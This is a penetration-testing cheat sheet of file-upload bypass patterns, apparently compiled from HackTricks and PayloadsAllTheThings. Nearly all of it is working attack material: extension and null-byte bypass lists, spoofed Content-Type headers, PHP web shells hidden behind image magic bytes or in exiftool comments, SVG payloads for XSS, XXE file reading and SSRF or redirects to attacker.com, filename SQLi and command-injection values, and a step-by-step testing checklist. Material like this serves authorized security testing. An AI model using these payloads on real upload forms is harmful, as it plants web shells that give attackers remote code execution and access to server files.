# File Upload Bypass Patterns

## Extension Impact Matrix
| Extension | Impact |
|-----------|--------|
| PHP, PHP5, PHTML, PHAR | Webshell, RCE |
| ASP, ASPX, CER, ASA | Webshell, RCE |
| JSP, JSPX, JSW | Webshell, RCE |
| SVG | Stored XSS, SSRF, XXE |
| XML | XXE |
| HTML, JS | XSS, Open Redirect |
| CSV | CSV Injection |
| AVI | LFI, SSRF |
| PDF, PPTX, DOCX | SSRF, Blind XXE |
| PNG, JPEG | Pixel Flood DoS |
| ZIP | RCE via LFI, DoS |

## Blacklist Bypass - Alternative Extensions
```bash
# PHP
.phtm, .phtml, .phps, .pht, .php2, .php3, .php4, .php5, .php7
.shtml, .phar, .pgif, .inc

# ASP
.asp, .aspx, .cer, .asa

# JSP  
.jsp, .jspx, .jsw, .jsv, .jspf

# Coldfusion
.cfm, .cfml, .cfc, .dbm
```

## Whitelist Bypass
```bash
file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php\x00.jpg
file.php%00
file.php%20
file.php%0d%0a.jpg
file.php.....
file.php/
file.php.\
file.php#.png
file.
.html
```

## Case Manipulation
```bash
.pHp
.pHP5
.PhAr
.AsP
.jSpX
```

## Null Byte Injection
```bash
file.php%00.gif
file.php\x00.gif
file.php%00.png
file.php%00.jpg
```

## Special Characters
```bash
file.php......     # Windows removes trailing dots
file.php%20        # Space
file.php%0d%0a.jpg # CRLF
file.php%0a        # Newline
file.php/          # Slash
file.php.\         # Backslash
file.j\sp          # Backslash in name
file.jsp/././././. # Multiple special chars

# RTLO (Right-to-Left Override)
name.%E2%80%AEphp.jpg → displays as name.gpj.php
```

## Content-Type Bypass
```http
# Change to image types
Content-Type: image/gif
Content-Type: image/png  
Content-Type: image/jpeg

# From
Content-Type: application/x-php
Content-Type: application/octet-stream
```

## Magic Bytes
```bash
# Add magic bytes at start of malicious file
PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
JPG: \xff\xd8\xff
GIF: GIF87a or GIF8;

# Create shell with JPG magic
echo -e '\xFF\xD8\xFF\xE0\n<?php system($_GET["cmd"]); ?>' > shell.jpg.pHp
```

## GIF Header Shell
```php
GIF89a; <?php system($_GET['cmd']); ?>
```

## Exiftool Comment Injection
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg
```

## SVG Payloads

### XSS via SVG
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

### XXE via SVG
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
   <text font-size="40" x="0" y="16">&xxe;</text>
</svg>
```

### SSRF via SVG
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://attacker.com/ssrf"/>
</svg>
```

### Open Redirect via SVG
```xml
<svg onload="window.location='https://attacker.com'" xmlns="http://www.w3.org/2000/svg"/>
```

## Filename Injection
```bash
# Directory Traversal
../../etc/passwd/logo.png
../../../logo.png

# SQLi
'sleep(10).jpg
sleep(10)-- -.jpg

# Command Injection
; sleep 10;
```

## Zip Slip
```bash
# Upload .php inside .zip, access via:
site.com/path?page=zip://path/file.zip%23rce.php
```

## NTFS ADS (Windows)
```bash
file.asax:.jpg      # Creates empty file.asax
file.asp::$data.    # Non-empty file
```

## Testing Checklist
1. [ ] Upload .php instead of .jpg
2. [ ] Double extensions: pic.jpg.php, pic.php.jpg
3. [ ] Change Content-Type to image/*
4. [ ] Case variations: .PhP, .pHP5
5. [ ] Special chars: %00, %0a, %20
6. [ ] Add GIF89a; header before PHP code
7. [ ] Magic bytes with hex editor
8. [ ] Exiftool comment injection

## References
- https://book.hacktricks.xyz/pentesting-web/file-upload
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
